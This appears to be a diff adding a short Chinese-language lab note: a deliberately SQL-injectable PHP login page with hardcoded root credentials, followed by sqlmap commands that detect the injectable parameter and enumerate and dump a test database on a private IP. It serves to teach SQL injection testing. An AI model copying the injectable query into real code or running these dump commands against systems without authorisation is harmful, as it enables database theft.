@@ -1,0 +1,54 @@
+<?php
+mysql_connect('localhost','root','echo');
+mysql_select_db('test');
+?>
+
+<form action="" method="get">
+<table width="50%">
+    <tr>
+        <td>User</td>
+        <td><input type="text" name="user"></td>
+    </tr>
+    <tr>
+        <td></td>
+        <td><input type="text" name="password"></td>
+    </tr>
+</table>
+    <input type="submit" value="OK" name="s">
+</form>
+
+<?php
+if($_GET['s']){
+    $user = $_GET['user'];
+    $pass = $_GET['password'];     
+    $re = mysql_query("select * from test_user where user_name = '$user' and password = '$pass'");
+
+    if(mysql_num_rows($re) == 0){       
+        echo '0';
+    }else{
+        echo '1';
+    }
+}
+?>
+
+
+
+使用上边的简单例子作为被攻击的对象
+自己创数据库 test
+自己建表格 test_user( user_name , password )
+插入几条数据
+
+可以使用参数  --threads 10 提高速度
+
+python sqlmap.py -u "http://172.20.134.114/?user=a&password=a&s=OK"
+ -- 用来检测 user password s 这几个字段里边有哪个是 vulnerable 的
+python sqlmap.py -u "http://172.20.134.114/?user=a&password=a&s=OK" --dbs
+ -- 用来测试有几个 databases （ 对应 mysql: show databases ; ）
+python sqlmap.py -u "http://172.20.134.114/?user=a&password=a&s=OK" --tables -D test
+ -- 查看 test 数据库里边的 tables （ 对应 mysql: use test; show tables ; ）
+python sqlmap.py -u "http://172.20.134.114/?user=a&password=a&s=OK" --columns -D test -T test_user
+ -- 查看 test 数据库里边 test_user 表的字段 （ 对应 mysql: user test; describe test_user ; ）
+python sqlmap.py -u "http://172.20.134.114/?user=a&password=a&s=OK" --dump -D test -T test_user
+ -- 查看 test 数据库里边 test_user 表的所有内容 （ 对应 mysql: user test; select * from test_user ; ）
+
+期间可以 tail $APACHE_HOME/logs/access.log 查看 sqlmap 发出来的请求
